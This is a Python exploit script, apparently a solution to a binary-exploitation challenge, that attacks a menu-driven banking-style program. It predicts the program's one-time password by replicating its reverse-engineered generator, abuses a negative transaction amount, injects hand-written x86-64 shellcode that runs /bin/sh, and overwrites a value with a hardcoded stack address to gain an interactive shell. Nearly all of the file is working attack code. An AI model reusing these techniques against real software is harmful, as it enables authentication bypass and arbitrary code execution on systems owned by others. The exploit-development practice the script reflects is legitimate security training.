import interact
import struct
import re

def extract_otp_seed(s):
    match = re.search(r"\((\d+)\)", s)
    return int(match.group(1)) if match else None

def predict_otp(seed):
    """
    Predicts the 8-character OTP based on a given seed value.
    This replicates the generate_OTP function from the provided assembly.
    
    Args:
        seed: An integer seed value (from current_session+0x30)
        
    Returns:
        An 8-character string representing the predicted OTP
    """
    otp = ""
    
    for i in range(8):  # Loop runs 8 times (index 0-7)
        # Replicate the assembly calculations
        eax = i * 2  # add eax, eax
        edx = 0x3059b9c1 >> eax  # mov edx, 0x3059b9c1; sar edx, cl
        eax = edx & 0xFF  # movzx eax, al
        ecx = eax ^ seed  # xor eax, dword [rbp-0x8]
        
        # This block replicates the division by 9 using the magic number multiplication
        # It's equivalent to ecx % 9
        # mov edx, 0x38e38e39; imul edx; sar edx, 0x1; sub edx, eax>>31
        edx = (ecx * 0x38e38e39) >> 32  # imul result goes in edx
        edx = edx >> 1  # sar edx, 0x1
        eax_sign = 1 if ecx < 0 else 0  # mov eax, ecx; sar eax, 0x1f
        edx = edx - eax_sign  # sub edx, eax
        
        # Calculate the remainder
        eax = edx * 9  # multiply by 9 (8+1)
        ecx = ecx - eax  # This gives us ecx % 9
        
        # Add 0x31 (ASCII '1') to make it a printable character
        char_code = ecx + 0x31
        otp += chr(char_code)
    
    return otp


# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('-+'))
print(p.readuntil('-+'))
print(p.readuntil('-+'))
print(p.readuntil('-+'))
otp_seed_line = p.readuntil('-+')
print(otp_seed_line)
otp_seed = extract_otp_seed(otp_seed_line)
print(otp_seed)
otp = predict_otp(otp_seed)
print(otp)
print(p.readuntil('exit:'))
p.sendline(otp)

print(p.readuntil('choice:'))
p.sendline('1')
p.sendline('-20000')
print(p.readuntil('continue...'))
p.sendline('\n')
for i in range(5):
    print(p.readuntil('choice:'))
    p.sendline('5')
    print(p.readuntil('choice:'))
    p.sendline('2')
    print(p.readuntil('continue...'))
    p.sendline('\n')
print(p.readuntil('choice:'))
p.sendline('4')
print(p.readuntil('(y/N)'))
p.sendline('y')
print(p.readuntil('INDEX:'))
p.sendline('5')
print(p.readuntil('TRANSACTION:'))

shellcode = (
    # Calculate 0x3b by adding 0x38 + 0x3
    "\x31\xf6"                  # xor esi, esi
    "\x48\xb9\x2f\x62\x69\x6e"  # movabs rcx, 0x6e69622f  ("/bin")
    "\x2f\x2f\x73\x68"          # with "/sh" (part of the same instruction)
    "\x56"                      # push rsi
    "\x51"                      # push rcx
    "\x54"                      # push rsp
    "\x5f"                      # pop rdi
    
    # Use alternative to get 0x3b in RAX without using the byte directly
    "\x6a\x38"                  # push 0x38
    "\x58"                      # pop rax
    "\x04\x03"                  # add al, 3  (now RAX = 0x3b)
    
    "\x31\xd2"                  # xor edx, edx
    "\x0f\x05"                  # syscall
)
shellcode += "\x90" * (0x20 - len(shellcode))
p.sendline(shellcode)

print(p.readuntil('ID:'))
p.sendline(p64(0x00007fffffffedd0))
p.interactive()
